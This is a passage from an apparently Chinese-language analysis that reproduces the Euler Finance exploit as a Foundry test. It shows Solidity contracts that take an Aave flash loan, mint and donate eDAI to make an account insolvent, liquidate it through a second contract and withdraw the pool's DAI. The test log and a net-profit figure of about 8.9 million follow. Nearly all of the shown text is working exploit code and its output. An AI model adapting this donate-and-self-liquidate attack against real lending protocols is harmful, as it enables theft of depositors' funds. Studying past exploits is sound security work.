        //此时拥有dDAI 3.9亿, 即欠款3.9亿
        //此时拥有eDAI 4.1亿多，含2次的2亿铸造以及通过eDAI.deposit获得的
        eDAI.mint(0, 200_000_000 * 1e18);
        console2.log(
            "[Violator] eDAI balance after eDAI.mint(2): ",
            eDAI.balanceOf(address(this)) / 1e18
        );
        console2.log(
            "[Violator] dDAI balance after eDAI.mint(2): ",
            dDAI.balanceOf(address(this)) / 1e18
        );

        //捐献1亿的eDAI给Euler池
        //此时拥有dDAI 3.9亿, 即欠款3.9亿
        //此时拥有eDAI 3.1亿多，
        eDAI.donateToReserves(0, 100_000_000 * 1e18);

        console2.log(
            "[Violator] eDAI balance after donateToReserves: ",
            eDAI.balanceOf(address(this)) / 1e18
        );
        console2.log(
            "[Violator] dDAI balance after donateToReserves: ",
            dDAI.balanceOf(address(this)) / 1e18
        );
        console2.log(
            "[Violator] DAI balance after donateToReserves: ",
            DAI.balanceOf(address(this)) / 1e18
        );
    }
}

contract Liquidator is Test {
    function checkHealth(address _who) private {
        //第一个参数是清算者地址， 不能传自己，否则会报错： [FAIL. Reason: e/liq/self-liquidation]
        IEuler.LiquidationOpportunity memory returnData = Euler
            .checkLiquidation(address(0), _who, address(DAI), address(DAI));

        emit log_named_decimal_uint("healthScore", returnData.healthScore, 18);
    }

    function liquidate(address liquidator, address violator) external {
        // 清算前，Liquidator没有eDAI,也没有dDAI
        console2.log(
            "[Liquidator] eDAI balance before liquidate: ",
            eDAI.balanceOf(address(this)) / 1e18
        );
        console2.log(
            "[Liquidator] dDAI balance after liquidate: ",
            dDAI.balanceOf(address(this)) / 1e18
        );

        // 计算清算机会
        IEuler.LiquidationOpportunity memory returnData = Euler
            .checkLiquidation(liquidator, violator, address(DAI), address(DAI));

        console2.log(
            "[Liquidator] checkLiquidation, repay: ",
            returnData.repay / 1e18
        );
        console2.log(
            "[Liquidator] checkLiquidation, yield: ",
            returnData.yield / 1e18
        );
        console2.log(
            "[Liquidator] checkLiquidation, healthScore: ",
            returnData.healthScore
        );
        console2.log(
            "[Liquidator] checkLiquidation, baseDiscount: ",
            returnData.baseDiscount
        );
        console2.log(
            "[Liquidator] checkLiquidation, discount: ",
            returnData.discount
        );
        console2.log(
            "[Liquidator] checkLiquidation, conversionRate: ",
            returnData.conversionRate
        );

        // 清算
        Euler.liquidate(
            violator,
            address(DAI),
            address(DAI),
            returnData.repay,
            returnData.yield
        );

        //清算后， 违规者的eDAI被转移给清算者
        console2.log(
            "[Liquidator] eDAI balance after liquidate: ",
            eDAI.balanceOf(address(this)) / 1e18
        );
        // 清算后， 违规者的dDAI（负债）也被转移给清算者（负债会按照打折价格转移给清算者）
        console2.log(
            "[Liquidator] dDAI balance after liquidate: ",
            dDAI.balanceOf(address(this)) / 1e18
        );

        // 清算后，EulerLiquidation的DAI余额大概3800多万
        console2.log(
            "[Liquidator] DAI balance of EulerLiquidation after liquidate: ",
            DAI.balanceOf(EulerLiquidation) / 1e18
        );

        checkHealth(address(this));

        // 提现，由于清算者此时有约2亿6千万eDAI, EulerLiquidation只有3800多万的DAI，根本不够兑换
        // 所以使用的是EulerLiquidation的最大值
        eDAI.withdraw(0, DAI.balanceOf(EulerLiquidation));
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));

        //还有很多eDAI没有提取出来
        console2.log(
            "[Liquidator] eDAI balance after withdraw: ",
            eDAI.balanceOf(address(this)) / 1e18
        );

        console2.log(
            "[Liquidator] dDAI balance after withdraw: ",
            dDAI.balanceOf(address(liquidator)) / 1e18
        );

        checkHealth(address(this));
    }
}

contract POC is Test {
    Violator violator;
    Liquidator liquidator;

    function setUp() public {
        vm.createSelectFork("mainnet", 16_817_995);
        vm.label(address(DAI), "DAI");
        vm.label(address(eDAI), "eDAI");
        vm.label(address(dDAI), "dDAI");
        vm.label(address(AaveV2), "AaveV2");
        vm.label(0xC6845a5C768BF8D7681249f8927877Efda425baf, "LogicOfAaveV2");
        vm.label(address(Euler), "Euler");
        vm.label(address(EulerLiquidation), "EulerLiquidation");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[POC] DAI balance after exploit",
            DAI.balanceOf(address(this)),
            DAI.decimals()
        );

        // 从AaveV2贷款3000万的DAI
        uint256 aaveFlashLoanAmount = 30000000 * 1e18;
        address[] memory assets = new address[](1);
        assets[0] = address(DAI);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = aaveFlashLoanAmount;
        uint256[] memory modes = new uint[](1);
        modes[0] = 0;
        bytes memory params = abi.encode();

        AaveV2.flashLoan(
            address(this), // receiver: the address that will receive the flash loan
            assets, // assets: an array of asset addresses to be borrowed
            amounts, // amounts: an array of amounts to be borrowed for each asset
            modes, // modes: an array of modes (0 = no debt, 1 = stable, 2 = variable) for each asset
            address(this), // onBehalfOf: the address on behalf of which the action is executed
            params, // params: additional data to be passed to the receiver
            0 // referralCode: referral code to be used for the flash loan
        );

        emit log_named_decimal_uint(
            "[POC] DAI balance after exploit",
            DAI.balanceOf(address(this)),
            DAI.decimals()
        );
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata
    ) external returns (bool) {
        violator = new Violator();
        liquidator = new Liquidator();
        //将贷款得到的3000万DAI转交给违规者
        DAI.transfer(address(violator), DAI.balanceOf(address(this)));
        //违规者做一些恶意操作
        violator.DoSometingEvil();

        //清算者清算违规者
        liquidator.liquidate(address(liquidator), address(violator));

        //从Eluer的获利数（不是净获利，还要还闪电贷的贷款3000多万）
        emit log_named_decimal_uint(
            "[POC] DAI balance after liquidate (before payback the loan)",
            DAI.balanceOf(address(this)),
            DAI.decimals()
        );

        //归还贷款：
        // 批准AaveV2从当前合约扣除贷款本金和利息
        //执行完业务逻辑后，fAaveV2会调用DAI::transferFrom从当前合约扣除贷款本金和利息
        DAI.approve(address(AaveV2), type(uint256).max);

        return true;
    }
}
```

输出

```solidity
[PASS] testExploit() (gas: 2853352)
Logs:
  [POC] DAI balance after exploit: 0.000000000000000000
  [Violator] eDAI balance after deposit DAI:  19568124
  [Violator] eDAI balance after eDAI.mint:  215249368
  [Violator] dDAI balance after eDAI.mint:  200000000
  [Violator] dDAI balance after dDAI.repay:  190000000
  [Violator] eDAI balance after dDAI.repay:  215249368
  [Violator] DAI balance after eDAI.mint:  0
  [Violator] eDAI balance after eDAI.mint(2):  410930612
  [Violator] dDAI balance after eDAI.mint(2):  390000000
  [Violator] eDAI balance after donateToReserves:  310930612
  [Violator] dDAI balance after donateToReserves:  390000000
  [Violator] DAI balance after donateToReserves:  0
  [Liquidator] eDAI balance before liquidate:  0
  [Liquidator] dDAI balance after liquidate:  0
  [Liquidator] checkLiquidation, repay:  259319058
  [Liquidator] checkLiquidation, yield:  317792963
  [Liquidator] checkLiquidation, healthScore:  750978643164551262
  [Liquidator] checkLiquidation, baseDiscount:  269021356835448738
  [Liquidator] checkLiquidation, discount:  200000000000000000
  [Liquidator] checkLiquidation, conversionRate:  1250000000000000000
  [Liquidator] eDAI balance after liquidate:  310930612
  [Liquidator] dDAI balance after liquidate:  259319058
  [Liquidator] DAI balance of EulerLiquidation after liquidate:  38904507
  healthScore: 1.146929824561403508
  [Liquidator] eDAI balance after withdraw:  272866200
  [Liquidator] dDAI balance after withdraw:  259319058
  healthScore: 1.019408031754312432
  [POC] DAI balance after liquidate (before payback the loan): 38904507.348306697267428294
  [POC] DAI balance after exploit: 8877507.348306697267428294
```

贷款：3000万， 净利润： 8877507 美刀
